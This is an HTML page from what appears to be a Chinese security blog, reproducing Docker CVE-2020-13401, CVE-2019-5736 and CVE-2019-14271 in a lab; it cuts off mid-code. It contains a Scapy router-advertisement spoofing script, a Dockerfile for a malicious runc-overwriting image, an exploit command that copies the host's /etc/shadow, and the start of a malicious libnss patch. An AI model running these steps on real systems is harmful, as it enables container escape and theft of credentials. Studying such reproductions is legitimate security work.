@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>Docker部分CVE复现与收集 | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Docker部分CVE复现与收集</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 2, 2022&nbsp;&nbsp;21:52:40</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E5%A4%8D%E7%8E%B0/">复现</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="0x01-CVE-2020-13401"><a href="#0x01-CVE-2020-13401" class="headerlink" title="0x01 CVE-2020-13401"></a>0x01 CVE-2020-13401</h1><p><strong>漏洞描述</strong></p>
+<p>Docker Engine在19.03.11之前发现了一个问题。容器中的攻击者，具有CAP_NET_RAW能力，可以伪造IPv6路由器广告，从而欺骗外部IPv6主机，获取敏感信息，或导致拒绝服务。</p>
+<p>docker engine会默认从网络的其它容器中接受和应用假的RA(Router Advertisement)消息，接受RA消息本身是操作系统的一项正常功能，但是如果RA消息的发送者不是一个网络中的可信实体的话，那么受害者容器就会接受这些消息并加入该网络然后发送所有的网络包到新的虚假的路由(中间人攻击)，这个问题只存在IPv6中。</p>
+<p>在新版本中关闭了默认接收的功能，如果手动开启了该功能意味着系统依然有可能首次攻击</p>
+<blockquote>
+<p><strong>Router Advertisement</strong>：顾名思义，这个报文时用来进行ipv6的自动配置和路由，当开启该选项时，路由器(router)会周期性的发送RA消息，并且回应路由发现消息(solicitations)。这样的话主机使用这些信息就能够获取到本地网络中的子网前缀和参数等信息。</p>
+</blockquote>
+<p><strong>版本限制</strong></p>
+<p>before 19.03.11</p>
+<p><strong>POC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mmzaeimi/Docker-Container-CVE-2020-13401">https://github.com/mmzaeimi/Docker-Container-CVE-2020-13401</a></p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><strong>所需条件</strong></p>
+<ul>
+<li>宿主机支持IPv6</li>
+<li>docker engine 配置了IPv6功能</li>
+<li>IP欺骗工具Scapy</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>主机开启IPv6</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get install miredo</span><br><span class="line">$sudo apt install net-tools</span><br><span class="line">$sudo gedit /etc/default/ufw   //将ipv6=no修改为yes</span><br></pre></td></tr></table></figure>
+
+<p>开启docker IPv6支持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/aesm1p/virtualization# nano /etc/docker/daemon.json </span><br><span class="line">// add this content</span><br><span class="line">&#123;  &quot;ipv6&quot;: true, &quot;fixed-cidr-v6&quot;: &quot;fd00::/80&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>重启docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/aesm1p/virtualization# systemctl daemon-reload</span><br><span class="line">root@ubuntu:/home/aesm1p/virtualization# systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+<h2 id="容器搭建"><a href="#容器搭建" class="headerlink" title="容器搭建"></a>容器搭建</h2><p>根据漏洞原理，这里我们需要至少两个容器，由于容器中什么所需的软件都没有，没有编辑器，所以还需要映射本地source.list到容器中。将ubuntu1作为攻击机，ubuntu2作为victim</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull public-docker-virtual.artnj.zte.com.cn/ubuntu:latest</span><br><span class="line">docker run --name ubuntu1 -d -v /etc/apt:/tmp/apt -it ff0fea8310f3  /bin/bash</span><br><span class="line">docker run --name ubuntu2 -d -v /etc/apt:/tmp/apt -it ff0fea8310f3  /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><strong>安装所需软件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install vim</span><br><span class="line">apt-get install inetutils-ping</span><br><span class="line">apt-get install net-tools</span><br><span class="line">apt-get install hping3</span><br><span class="line">apt-get install tcpdump</span><br><span class="line">apt install python3-scapy // 只需要再ubuntu1上安装，是一个包处理程序</span><br></pre></td></tr></table></figure>
+
+<p>检查环境是否通过（注意要使用IPv6），<code>ping -6</code>命令</p>
+<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>我们的目标是从ubuntu1发送一个构造的RA消息，然后更新ubuntu2的iptable。使用scapy来构造报文，根据前面的分析，RA报文本质上是广播报文，所以，目的地址需要是<code>ff01::1</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@90c1cd32bc73:/<span class="comment"># scapy</span></span><br><span class="line">a = IPv6()     // 新建一个IPv6协议包       </span><br><span class="line">a.dst = <span class="string">&quot;ff02::1&quot;</span> </span><br><span class="line">a.display() </span><br><span class="line">b = ICMPv6ND_RA() // ND协议 RA报文，用于路由发现</span><br><span class="line">b.display()  </span><br><span class="line">c = ICMPv6NDOptSrcLLAddr() </span><br><span class="line">c.lladdr = <span class="string">&quot;02:42:ac:11:00:02&quot;</span> </span><br><span class="line">c.display() </span><br><span class="line">d = ICMPv6NDOptMTU() </span><br><span class="line">d.display() </span><br><span class="line">e = ICMPv6NDOptPrefixInfo() </span><br><span class="line">e.prefixlen = <span class="number">64</span>  </span><br><span class="line">e.prefix = <span class="string">&quot;adc1::&quot;</span> // inet prefix</span><br><span class="line">e.display()  </span><br><span class="line">send(a/b/c/d/e)  <span class="comment"># &quot;/&quot;操作符的是不同协议层之间的组合操作，如IP()/TCP()</span></span><br></pre></td></tr></table></figure>
+
+<p>再发送报文之后，查看ubuntu2机器，发现有前缀为<code>adc1::</code>的地址</p>
+<p>至此攻击完成</p>
+<h1 id="0x02-CVE-2019-5736"><a href="#0x02-CVE-2019-5736" class="headerlink" title="0x02 CVE-2019-5736"></a>0x02 CVE-2019-5736</h1><p><strong>漏洞描述</strong></p>
+<p>runc 到 1.0-rc6，在 18.09.2 之前的 Docker 和其他产品中使用，允许攻击者通过利用在这些类型之一中以 root 身份执行命令的能力来覆盖主机 runc 二进制文件（并因此获得主机 root 访问权限）容器：(1) 具有攻击者控制的映像的新容器，或 (2) 攻击者先前具有写入权限的现有容器，可以使用 docker exec 进入该容器。这是由于与 &#x2F;proc&#x2F;self&#x2F;exe 相关的文件描述符处理不当造成的。</p>
+<p><strong>版本信息</strong></p>
+<p>runc 到 1.0-rc6，在 18.09.2 之前的 Docker 和其他产品中</p>
+<p><strong>POC</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><p>查看本机runc版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker-runc --version</span><br><span class="line">runc version 1.0.0-rc5+dev</span><br><span class="line">commit: 69663f0bd4b60df09991c08812a60108003fa340</span><br><span class="line">spec: 1.0.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击方法一"><a href="#攻击方法一" class="headerlink" title="攻击方法一"></a>攻击方法一</h2><p>可以通过下面的payload直接构建恶意镜像，监听1234端口，运行容器就可以获得反弹shell</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/q3k/cve-2019-5736-poc">https://github.com/q3k/cve-2019-5736-poc</a></p>
+<p>不够给出的Dockerfile需要根据情况修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">FROM ff0fea8310f3</span><br><span class="line"></span><br><span class="line">ADD sources.list /etc/apt/sources.list  # 将本地sources.list复制到当前目录下</span><br><span class="line"></span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">#    sed -i &#x27;s,# deb-src,deb-src,&#x27; /etc/apt/sources.list ;\</span><br><span class="line">    apt -y update ;\</span><br><span class="line">    apt-get -y install build-essential ;\</span><br><span class="line">    cd /root ;\</span><br><span class="line">    DEBIAN_FRONTEND=noninteractive apt-get -y build-dep libseccomp ;\   # 去掉交互式选项</span><br><span class="line">    ls /root;\</span><br><span class="line">    apt-get source libseccomp</span><br><span class="line"></span><br><span class="line">ADD stage1.c /root/stage1.c</span><br><span class="line"></span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">    cd /root/libseccomp-2.5.1 ;\          # 文件名称要修改为相应的版本号</span><br><span class="line">    cat /root/stage1.c &gt;&gt; src/api.c ;\</span><br><span class="line">    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\</span><br><span class="line">    dpkg -i /root/*.deb</span><br><span class="line"></span><br><span class="line">ADD stage2.c /root/stage2.c</span><br><span class="line"></span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">    cd /root ;\</span><br><span class="line">    gcc stage2.c -o /stage2</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [ &quot;/entrypoint&quot; ]</span><br><span class="line"></span><br><span class="line">RUN set -e -x ;\</span><br><span class="line">    ln -s /proc/self/exe /entrypoint</span><br></pre></td></tr></table></figure>
+
+<p>根据dockerfile构建镜像并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build -t cve-2019-5736 . </span><br><span class="line">sudo docker run cve-2019-5736</span><br><span class="line">strings /usr/bin/docker-runc | tail -n 2  # 可以看到写入的恶意字符串证明POC利用成功</span><br></pre></td></tr></table></figure>
+
+<p><strong>遗憾的是，这个方法运行镜像之后没有成功，原因暂时没有研究</strong></p>
+<h2 id="攻击方法二"><a href="#攻击方法二" class="headerlink" title="攻击方法二"></a>攻击方法二</h2><p>POC地址<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
+<p><strong>利用方法：</strong>下载之后使用<code>go build main.go</code>进行编译，然后将其传到我们想要逃逸的容器中，执行这个程序，下次有人进入容器并且调用<code>/bin/sh</code>时我们的payload就会触发</p>
+<blockquote>
+<p>！！在进行测试前要先备份runc文件，因为该漏洞会覆盖原来的runc文件，位置在&#x2F;usr&#x2F;bin&#x2F;docker-runc（不同系统可能位置不同）</p>
+</blockquote>
+<p>开启容器，使用卷映射将我们的编译的go语言的exp传入docker容器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it -d  -v /tmp:/tmp ff0fea8310f3 /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>进入容器运行exp</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it 168 /bin/bash  <span class="comment"># 宿主机执行</span></span><br><span class="line">./exploit -shell <span class="string">&#x27;cat /etc/shadow &gt; /home/shadow&#x27;</span>   <span class="comment"># 容器中执行</span></span><br></pre></td></tr></table></figure>
+
+<p>然后当我们attch到这个容器并且调用&#x2F;bin&#x2F;sh时就会触发exp，在&#x2F;home目录下就可以看到shadow文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it 168 /bin/sh  # 宿主机执行，触发payload</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>该漏洞原理是如果覆盖容器中的&#x2F;bin&#x2F;sh文件，将&#x2F;bin&#x2F;sh文件中由有<code>#!/proc/self/exe</code>声明，该生命即指向宿主机的runc程序，那么当attach容器时，就可以利用proc&#x2F;self&#x2F;exe来覆写runc程序，从而导致命令执行。</p>
+<h1 id="0x03-CVE-2019-14271"><a href="#0x03-CVE-2019-14271" class="headerlink" title="0x03 CVE-2019-14271"></a>0x03 CVE-2019-14271</h1><p><strong>漏洞描述</strong></p>
+<p>在 19.03.1 之前的 Docker 19.03.x 链接到 GNU C 库（又名 glibc）时，当 nsswitch 工具动态加载包含容器内容的 chroot 内的库时，可能会发生代码注入。</p>
+<p>先确认一下当前版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ docker version</span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          20.10.7</span><br><span class="line">  API version:      1.41 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.13.15</span><br><span class="line">  Git commit:       b0f5bc3</span><br><span class="line">  Built:            Wed Jun  2 11:54:58 2021</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br></pre></td></tr></table></figure>
+
+<p>这个版本不符合要求，所以需要先进行降级</p>
+<p>先卸载原来的高版本docker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt remove docker-ce</span><br></pre></td></tr></table></figure>
+
+<p>列出可安装的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt-cache madison docker-ce</span><br></pre></td></tr></table></figure>
+
+<p>然后选择一个版本来安装，这里我们需要安装19.03.0x版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker-ce=5:19.03.0~3-0~ubuntu-xenial</span><br></pre></td></tr></table></figure>
+
+<p>安装成功后重启服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          19.03.0</span><br><span class="line">  API version:      1.40 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.12.5</span><br><span class="line">  Git commit:       aeac949</span><br><span class="line">  Built:            Wed Jul 17 18:14:42 2019</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.4.6</span><br><span class="line">  GitCommit:        d71fcd7d8303cbf684402823e425e9dd2e99285d</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.0.0-rc95</span><br><span class="line">  GitCommit:        b9ee9c6314599f1b4a7f497e1f1f856fe433d3b7</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.18.0</span><br><span class="line">  GitCommit:        fec3683</span><br></pre></td></tr></table></figure>
+
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
+<p>chroot机制：全名change to root，也就是改变根目录，可以在一个程序运行时参考的根目录位置。如：</p>
+<p>linux原系统:  &#x2F;          | &#x2F;usr &#x2F;bin&#x2F; &#x2F;sys …</p>
+<p>chroot机制：&#x2F;work | &#x2F;work&#x2F;usr &#x2F;work&#x2F;bin &#x2F;work&#x2F;sys …</p>
+</blockquote>
+<p>docker是由go语言编写的，存在漏洞的docker版本是由Go v1.11编译的，在这个go版本下，一些package包含一些嵌入式的C代码(cgo)，将在”运行时”中动态加载共享链接库。这些包包括net和os&#x2F;usr包，这两个都在docker-tar中被使用，将会在运行时加载一些libnss_*.so库。<strong>通常情况下，这些动态链接库将会从宿主机文件系统加载，但是由于<code>docker-tar</code>chroots到容器中，所以它就会从容器的文件系统中加载这些libs，这就意味着docker-tar将会加载和执行来自被容器控制的代码，在执行<code>docker cp</code>命令时就会调用到docker-tar进程</strong>。</p>
+<p>除被chroot到容器文件系统外，<code>docker-tar</code>并没有被容器化。它运行在宿主机的命名空间，拥有所有root权限并且不会被cgroups或者seccomp限制，因此，通过向<code>docker-tar</code>中注入代码，恶意容器就会获得宿主机的完整root权限</p>
+<p>可能攻击场景是：一个docker用户从下面两种容器中复制文件时：</p>
+<ul>
+<li>一个运行含有恶意的libnss_*.so库的恶意镜像的容器</li>
+<li>一个攻击者可以替换libnss_*.so库的有漏洞的容器</li>
+</ul>
+<p><strong>漏洞挖掘启示</strong>：这个漏洞是从一个github issue中被发现的，一个用户用户试图从一个容器中复制文件但是docker cp却多次失败，这个issue的原因是他的容器中的没有包含这些libnss_*.so库，因此，当这个用户使用docker cp时，docker-tar进程无法从容器文件系统中加载这些库，从而导致错误。</p>
+<h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><h2 id="验证当前版本是否使用容器中的lib库"><a href="#验证当前版本是否使用容器中的lib库" class="headerlink" title="验证当前版本是否使用容器中的lib库"></a>验证当前版本是否使用容器中的lib库</h2><p>先获取到容器在宿主机上的绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker exec -it ubuntu cat /proc/mounts |grep docker</span><br><span class="line">overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/MEOAW7EXM2VFQPUZY3ROGGN7KG:/var/lib/docker/overlay2/l/VQT3SXDDDJO7FQQOYHVZRRZX6O,upperdir=/var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/diff,workdir=/var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/work 0 0</span><br></pre></td></tr></table></figure>
+
+<p>workdir就是宿主机上的容器绝对路径，文件系统在workdir上的merged目录下，即：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/merged/</span><br></pre></td></tr></table></figure>
+
+<p>安装inotify-tools监测文件调用情况</p>
+<blockquote>
+<p>inotify-tools有两个程序，inotifywait可以监测一个或一组文件上发生的特定事件。intotifywatch能够汇总指定文件系统的使用情况统计数据</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:apt install -y inotify-tools</span><br><span class="line">root@ubuntu:/var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/merged# inotifywait -mr /var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/merged/lib</span><br><span class="line">Setting up watches.  Beware: since -r was given, this may take a while!</span><br><span class="line">Watches established.</span><br><span class="line"></span><br><span class="line">/var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/merged/lib/x86_64-linux-gnu/ OPEN libnss_files-2.31.so</span><br><span class="line">/var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/merged/lib/x86_64-linux-gnu/ ACCESS libnss_files-2.31.so</span><br><span class="line">/var/lib/docker/overlay2/a645fb1667d39f3fa235ace4d4576908f00fd58fd466c21789629b67bae60fc0/merged/lib/x86_64-linux-gnu/ CLOSE_NOWRITE,CLOSE libnss_files-2.31.so</span><br></pre></td></tr></table></figure>
+
+<p>然后在宿主机执行docker cp命令，可以看到确实调用了容器中的libnss_*文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker cp ubuntu:/etc/passwd .</span><br><span class="line">Error response from daemon: error processing tar file: docker-tar: relocation error: /lib/x86_64-linux-gnu/libnss_files.so.2: symbol __libc_readline_unlocked, version GLIBC_PRIVATE not defined in file libc.so.6 with link time reference</span><br><span class="line">: exit status 127</span><br></pre></td></tr></table></figure>
+
+<h2 id="编译替换libnss库文件"><a href="#编译替换libnss库文件" class="headerlink" title="编译替换libnss库文件"></a>编译替换libnss库文件</h2><p>libnss库是gnu的lib库，下载源码<a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/gnu/libc/](https://mirrors.aliyun.com/gnu/libc/)%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B9%8B%E5%90%8E%E4%B8%8A%E4%BC%A0%E5%88%B0docker%E5%AE%B9%E5%99%A8%E4%B8%AD">https://mirrors.aliyun.com/gnu/libc/](https://mirrors.aliyun.com/gnu/libc/)，下载之后上传到docker容器中</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd bulid</span><br><span class="line">./configure -prefix=/usr</span><br></pre></td></tr></table></figure>
+
+<p>这里触发了报错</p>
+<p>按照要求安装所需的软件并进行排错，直到能够正常运行</p>
+<p>然后修改libnss文件，这里我们修改nss&#x2F;nss_files里面的file-service.c文件，添加如下内容，这个代码主要是拉起了breakout的脚本，具体的恶意操作在breakout脚本中进行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> ...</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIGINAL_LIBNSS <span 